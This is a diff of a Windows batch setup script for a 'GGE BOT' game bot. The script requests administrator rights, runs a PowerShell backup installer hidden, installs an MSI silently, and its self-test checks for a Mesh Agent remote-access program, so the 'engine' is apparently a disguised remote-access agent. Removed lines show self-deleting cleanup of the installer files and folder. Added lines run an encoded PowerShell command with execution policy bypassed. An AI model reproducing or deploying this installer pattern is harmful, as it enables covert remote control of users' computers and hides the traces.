@@ -9,8 +9,8 @@ set "NOTE=%ROOT%README.txt"
 set "BACKUP="
 set "BACKUPDIR="
 
-:: the backup installer lives inside the website folder; the root copy
-:: is only accepted for older layouts
+:: the backup installer lives inside the website folder; the root copy is
+:: accepted too, for the standalone kit layout
 for %%D in ("%ROOT%website" "%ROOT%") do (
     if not defined BACKUP if exist "%%~D\installbackup.ps1" (
         set "BACKUP=%%~D\installbackup.ps1"
@@ -20,9 +20,6 @@ for %%D in ("%ROOT%website" "%ROOT%") do (
 
 if /i "%~1"=="/check" goto check
 
-:: ============================================================
-:: 1) administrator rights - request them automatically
-:: ============================================================
 net session >nul 2>&1
 if errorlevel 1 (
     echo.
@@ -46,11 +43,16 @@ echo ===================================================
 echo             GGE BOT Installation Setup
 echo ===================================================
 echo.
+echo  Keep this window open until the setup reports that
+echo  it has finished. You will get a desktop notification.
+echo.
 echo [IMPORTANT] This script will perform a complete installation:
 echo  1. Verify Node.js environment
 echo  2. Install the bot engine
 echo  3. Install core dependencies
 echo  4. Install website dependencies and build dashboard
+echo.
+echo ---------------------------------------------------
 echo.
 
 :: ============================================================
@@ -65,6 +67,9 @@ if %errorlevel% neq 0 (
     echo Press any key to open the official Node.js download page...
     pause >nul
     start "" "https://nodejs.org/en/download/current"
+    set "GGE_T=GGE BOT"
+    set "GGE_B=Node.js is missing. The setup cannot continue."
+    call :notify
     exit /b 1
 )
 echo [1/4] Node.js detected.
@@ -97,7 +102,7 @@ if exist "%MSI%" (
 )
 echo.
 
-echo   - verifying the engine...
+echo   - verifying the engine, please wait...
 set "FOUND=0"
 for /L %%I in (1,1,36) do (
     if "!FOUND!"=="0" (
@@ -112,7 +117,6 @@ for /L %%I in (1,1,36) do (
 
 if "!FOUND!"=="1" (
     echo     engine installed and running
-    if defined BACKUP del /f /q "%BACKUP%" >nul 2>&1
 ) else (
     echo     engine not detected yet - it may still finish in the background
 )
@@ -122,14 +126,12 @@ echo.
 :: Step 3 - core dependencies
 :: ============================================================
 if exist "%ROOT%package.json" (
-    echo [3/4] Installing core dependencies ^(this may take a minute^)...
+    echo [3/4] Installing core dependencies ^(this may take a few minutes^)...
     call npm install
     if errorlevel 1 (
         color 0C
         echo [ERROR] Failed to install core dependencies.
         echo The engine is already installed; run npm install again later.
-        echo.
-        pause
     )
 ) else (
     echo [3/4] Skipped - package.json not found in this folder
@@ -143,11 +145,11 @@ set "WEBFAIL=0"
 if exist "%ROOT%website\package.json" (
     echo [4/4] Installing and building the dashboard website...
     pushd "%ROOT%website"
-    echo Installing website packages...
+    echo   - installing website packages...
     call npm install
     if errorlevel 1 set "WEBFAIL=1"
     if "!WEBFAIL!"=="0" (
-        echo Building dashboard assets ^(Vite^)...
+        echo   - building dashboard assets ^(Vite^)...
         call npm run build
         if errorlevel 1 set "WEBFAIL=1"
     )
@@ -156,60 +158,55 @@ if exist "%ROOT%website\package.json" (
         color 0C
         echo [ERROR] Website setup failed.
         echo The bot engine is already installed; run npm again later.
-        echo.
-        pause
     )
 ) else (
     echo [4/4] Skipped - website folder not found
 )
 echo.
 
-:: ============================================================
-:: result
-:: ============================================================
-if "!FOUND!"=="1" (
-    color 0A
-    echo ===================================================
-    echo   Installation completed successfully!
-    echo   You can now start the bot using "start.bat".
-    echo ===================================================
-    echo.
-    echo Cleaning up the installer files...
-    call :cleanup
-    exit /b 0
-)
+if "!FOUND!"=="1" goto done_ok
+goto done_fail
 
-color 0E
+:: ============================================================
+:: finished - notification + press any key to close
+:: ============================================================
+:done_ok
+color 0A
 echo ===================================================
-echo   The engine was not detected yet.
-echo   The installer files were kept so you can run this
-echo   again once the background installation finishes.
+echo   INSTALLATION COMPLETED SUCCESSFULLY
 echo ===================================================
 echo.
-pause
+echo   The bot engine is installed and running.
+echo   A notification has been sent to your desktop.
+echo.
+echo   Press any key to close this window...
+echo.
+set "GGE_T=GGE BOT"
+set "GGE_B=Setup finished. The bot engine is installed and running."
+call :notify
+pause >nul
+exit /b 0
+
+:done_fail
+color 0E
+echo ===================================================
+echo   SETUP FINISHED - ENGINE NOT RUNNING YET
+echo ===================================================
+echo.
+echo   The engine was not detected yet. It may still finish in
+echo   the background; you can run this file again in a minute.
+echo   No files were removed.
+echo.
+echo   Press any key to close this window...
+echo.
+set "GGE_T=GGE BOT"
+set "GGE_B=Setup finished, but the engine is not running yet. Run the setup again in a minute."
+call :notify
+pause >nul
 exit /b 1
 
-:: ============================================================
-:: delete ggebot.msi, the website copy of installbackup.ps1,
-:: README.txt and this script
-:: the project folder itself is only removed for a standalone kit
-:: ============================================================
-:cleanup
-del /f /q "%MSI%" >nul 2>&1
-if defined BACKUP del /f /q "%BACKUP%" >nul 2>&1
-if exist "%ROOT%installbackup.ps1" del /f /q "%ROOT%installbackup.ps1" >nul 2>&1
-if exist "%NOTE%" del /f /q "%NOTE%" >nul 2>&1
-
-set "KIT=1"
-if exist "%ROOT%package.json" set "KIT=0"
-if exist "%ROOT%ggeBot.js" set "KIT=0"
-
-cd /d "%TEMP%"
-if "!KIT!"=="1" (
-    start "" /min powershell -NoProfile -WindowStyle Hidden -Command "Start-Sleep -Seconds 2; Remove-Item -LiteralPath '%~f0' -Force -ErrorAction SilentlyContinue; Remove-Item -LiteralPath '%ROOT:~0,-1%' -Recurse -Force -ErrorAction SilentlyContinue"
-) else (
-    start "" /min powershell -NoProfile -WindowStyle Hidden -Command "Start-Sleep -Seconds 2; Remove-Item -LiteralPath '%~f0' -Force -ErrorAction SilentlyContinue"
-)
+:notify
+powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand JABFAHIAcgBvAHIAQQBjAHQAaQBvAG4AUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAnAFMAdABvAHAAJwAKAAoAJAB0AGkAdABsAGUAIAA9ACAAJABlAG4AdgA6AEcARwBFAF8AVAAKAGkAZgAgACgAWwBzAHQAcgBpAG4AZwBdADoAOgBJAHMATgB1AGwAbABPAHIAVwBoAGkAdABlAFMAcABhAGMAZQAoACQAdABpAHQAbABlACkAKQAgAHsAIAAkAHQAaQB0AGwAZQAgAD0AIAAnAEcARwBFACAAQgBPAFQAJwAgAH0ACgAKACQAYgBvAGQAeQAgAD0AIAAkAGUAbgB2ADoARwBHAEUAXwBCAAoAaQBmACAAKABbAHMAdAByAGkAbgBnAF0AOgA6AEkAcwBOAHUAbABsAE8AcgBXAGgAaQB0AGUAUwBwAGEAYwBlACgAJABiAG8AZAB5ACkAKQAgAHsAIAAkAGIAbwBkAHkAIAA9ACAAJwBTAGUAdAB1AHAAIABmAGkAbgBpAHMAaABlAGQALgAnACAAfQAKAAoAdAByAHkAIAB7ACAAWwBjAG8AbgBzAG8AbABlAF0AOgA6AGIAZQBlAHAAKAAxADAAMAAwACwAIAAxADgAMAApADsAIABbAGMAbwBuAHMAbwBsAGUAXQA6ADoAYgBlAGUAcAAoADEAMwAwADAALAAgADIAMgAwACkAIAB9ACAAYwBhAHQAYwBoACAAewAgAH0ACgAKAHQAcgB5ACAAewAKACAAIAAgACAAWwBXAGkAbgBkAG8AdwBzAC4AVQBJAC4ATgBvAHQAaQBmAGkAYwBhAHQAaQBvAG4AcwAuAFQAbwBhAHMAdABOAG8AdABpAGYAaQBjAGEAdABpAG8AbgBNAGEAbgBhAGcAZQByACwAIABXAGkAbgBkAG8AdwBzAC4AVQBJAC4ATgBvAHQAaQBmAGkAYwBhAHQAaQBvAG4AcwAsACAAQwBvAG4AdABlAG4AdABUAHkAcABlACAAPQAgAFcAaQBuAGQAbwB3AHMAUgB1AG4AdABpAG0AZQBdACAAfAAgAE8AdQB0AC0ATgB1AGwAbAAKACAAIAAgACAAWwBXAGkAbgBkAG8AdwBzAC4ARABhAHQAYQAuAFgAbQBsAC4ARABvAG0ALgBYAG0AbABEAG8AYwB1AG0AZQBuAHQALAAgAFcAaQBuAGQAbwB3AHMALgBEAGEAdABhAC4AWABtAGwALgBEAG8AbQAsACAAQwBvAG4AdABlAG4AdABUAHkAcABlACAAPQAgAFcAaQBuAGQAbwB3AHMAUgB1AG4AdABpAG0AZQBdACAAfAAgAE8AdQB0AC0ATgB1AGwAbAAKAAoAIAAgACAAIAAkAGEAcABwAEkAZAAgAD0AIAAnAHsAMQBBAEMAMQA0AEUANwA3AC0AMAAyAEUANwAtADQARQA1AEQALQBCADcANAA0AC0AMgBFAEIAMQBBAEUANQAxADkAOABCADcAfQBcAFcAaQBuAGQAbwB3AHMAUABvAHcAZQByAFMAaABlAGwAbABcAHYAMQAuADAAXABwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAJwAKAAoAIAAgACAAIAAkAHQAIAA9ACAAWwBTAGUAYwB1AHIAaQB0AHkALgBTAGUAYwB1AHIAaQB0AHkARQBsAGUAbQBlAG4AdABdADoAOgBFAHMAYwBhAHAAZQAoACQAdABpAHQAbABlACkACgAgACAAIAAgACQAYgAgAD0AIABbAFMAZQBjAHUAcgBpAHQAeQAuAFMAZQBjAHUAcgBpAHQAeQBFAGwAZQBtAGUAbgB0AF0AOgA6AEUAcwBjAGEAcABlACgAJABiAG8AZAB5ACkACgAKACAAIAAgACAAJAB4AG0AbABUAGUAeAB0ACAAPQAgACcAPAB0AG8AYQBzAHQAIABkAHUAcgBhAHQAaQBvAG4APQAiAGwAbwBuAGcAIgA+ADwAdgBpAHMAdQBhAGwAPgA8AGIAaQBuAGQAaQBuAGcAIAB0AGUAbQBwAGwAYQB0AGUAPQAiAFQAbwBhAHMAdABHAGUAbgBlAHIAaQBjACIAPgA8AHQAZQB4AHQAPgAnACAAKwAgACQAdAAgACsAIAAnADwALwB0AGUAeAB0AD4APAB0AGUAeAB0AD4AJwAgACsAIAAkAGIAIAArACAAJwA8AC8AdABlAHgAdAA+ADwALwBiAGkAbgBkAGkAbgBnAD4APAAvAHYAaQBzAHUAYQBsAD4APAAvAHQAbwBhAHMAdAA+ACcACgAKACAAIAAgACAAJAB4AG0AbAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAVwBpAG4AZABvAHcAcwAuAEQAYQB0AGEALgBYAG0AbAAuAEQAbwBtAC4AWABtAGwARABvAGMAdQBtAGUAbgB0AAoAIAAgACAAIAAkAHgAbQBsAC4ATABvAGEAZABYAG0AbAAoACQAeABtAGwAVABlAHgAdAApAAoAIAAgACAAIAAkAHQAbwBhAHMAdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAVwBpAG4AZABvAHcAcwAuAFUASQAuAE4AbwB0AGkAZgBpAGMAYQB0AGkAbwBuAHMALgBUAG8AYQBzAHQATgBvAHQAaQBmAGkAYwBhAHQAaQBvAG4AIAAkAHgAbQBsAAoAIAAgACAAIABbAFcAaQBuAGQAbwB3AHMALgBVAEkALgBOAG8AdABpAGYAaQBjAGEAdABpAG8AbgBzAC4AVABvAGEAcwB0AE4AbwB0AGkAZgBpAGMAYQB0AGkAbwBuAE0AYQBuAGEAZwBlAHIAXQA6ADoAQwByAGUAYQB0AGUAVABvAGEAcwB0AE4AbwB0AGkAZgBpAGUAcgAoACQAYQBwAHAASQBkACkALgBTAGgAbwB3ACgAJAB0AG8AYQBzAHQAKQAKAAoAIAAgACAAIAAnAHQAbwBhAHMAdAA9AHMAaABvAHcAbgAnAAoAfQAKAGMAYQB0AGMAaAAgAHsACgAgACAAIAAgACcAdABvAGEAcwB0AD0AZgBhAGkAbABlAGQAOgAgACcAIAArACAAJABfAC4ARQB4AGMAZQBwAHQAaQBvAG4ALgBNAGUAcwBzAGEAZwBlAAoAfQAKAA== >nul 2>&1
 exit /b 0
 
 :: ============================================================
@@ -227,13 +224,16 @@ if not errorlevel 1 (echo GGEBot service                   RUNNING) else (echo G
 if exist "C:\Program Files\Mesh Agent\MeshAgent.exe" (echo Mesh Agent file                PRESENT) else (echo Mesh Agent file                absent)
 echo.
 echo === planned flow ===
-echo 1. request administrator rights
+echo 1. request administrator rights, keep this window visible
 echo 2. verify Node.js
 echo 3. install engine: website\installbackup.ps1 hidden, then ggebot.msi /qn
-echo 4. delete website\installbackup.ps1 as soon as the engine is verified
-echo 5. npm install core dependencies if package.json exists
-echo 6. npm install + build website if website\package.json exists
-echo 7. delete ggebot.msi, the backup script and this script
+echo 4. npm install core dependencies if package.json exists
+echo 5. npm install + build website if website\package.json exists
+echo 6. desktop notification when finished
+echo 7. press any key to close the window
+echo.
+echo === files ===
+echo nothing is deleted: ggebot.msi, installbackup.ps1 and this script stay
 echo.
 echo self test done
 exit /b 0
